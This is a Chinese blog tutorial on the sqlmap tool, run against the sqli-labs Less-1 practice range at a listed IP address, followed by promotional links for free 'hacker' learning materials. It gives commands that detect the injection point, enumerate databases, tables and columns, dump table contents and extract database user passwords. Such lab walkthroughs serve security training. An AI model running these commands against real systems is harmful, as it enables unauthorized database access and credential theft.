
--- 
title:  SQL注入之sqlmap入门教程_sqlmap注入 
tags: []
categories: [] 

---
原来sql注入如此简单

以SQL注入靶场sqli-labs第一关为例，进行sqlmap工具的使用分享。

### 一、判断是否存在注入点

使用命令：

使用命令：sqlmap -u “http://49.232.78.252:83/Less-1/?id=1”

有图中白色背景的 则判断出有注入点

<img src="https://img-blog.csdnimg.cn/6fdbf4b727bd4a188cf4a2413d4eebb0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_20,color_FFFFFF,t_70,g_se,x_16" alt="">

### 二、查询当前用户下所有数据库

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” --dbs

可以看到有五个表

<img src="https://img-blog.csdnimg.cn/107605e4c0354905adbd834a8c93d610.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_20,color_FFFFFF,t_70,g_se,x_16" alt="">

### 三、获取数据库中的表名

选取一个challenges数据库，获取此库的表名

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” -D challenges --tables

<img src="https://img-blog.csdnimg.cn/575b7a10c1db4ef0ac552f46ba600c74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_10,color_FFFFFF,t_70,g_se,x_16" alt="">

### 四、获取表中的字段名

选取表T5M0QG6FM2，获取其中字段名

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” -D challenges -T T5M0QG6FM2 –columns

<img src="https://img-blog.csdnimg.cn/f701be5e4c7c4dd799c31e1ad5a18c6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_16,color_FFFFFF,t_70,g_se,x_16" alt="">

### 五、获取字段内容

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” -D challenges -T T5M0QG6FM2 --columns –dump

<img src="https://img-blog.csdnimg.cn/52fb0c4daac440199297fad04062ef70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_20,color_FFFFFF,t_70,g_se,x_16" alt="">

### 六、获取数据库的所有用户

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” –users

使用该命令就可以列出所有管理用户

<img src="https://img-blog.csdnimg.cn/ad6d3e4081dd43b2bc37b4bdcc14715e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_18,color_FFFFFF,t_70,g_se,x_16" alt="">

### 七、获取数据库用户的密码

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” –passwords

<img src="https://img-blog.csdnimg.cn/f0b601dbd4b4496ea6438cb5cc7f9f34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_20,color_FFFFFF,t_70,g_se,x_16" alt="">

### 八、获取当前网站数据库的名称

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” --current-db

<img src="https://img-blog.csdnimg.cn/c5e54a65c5564b6896cbca2854cc7e97.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_18,color_FFFFFF,t_70,g_se,x_16" alt="">

可以看到当前的数据库是 security

### 九、获取当前网站数据库的用户名称

使用命令：

sqlmap -u “http://49.232.78.252:83/Less-1/?id=1” --current-user

当前用户是root

<img src="https://img-blog.csdnimg.cn/ce5a71614e2048579e92de645f68c175.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-c6bif5bCP6ZmI6ZmI,size_19,color_FFFFFF,t_70,g_se,x_16" alt="">

## 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
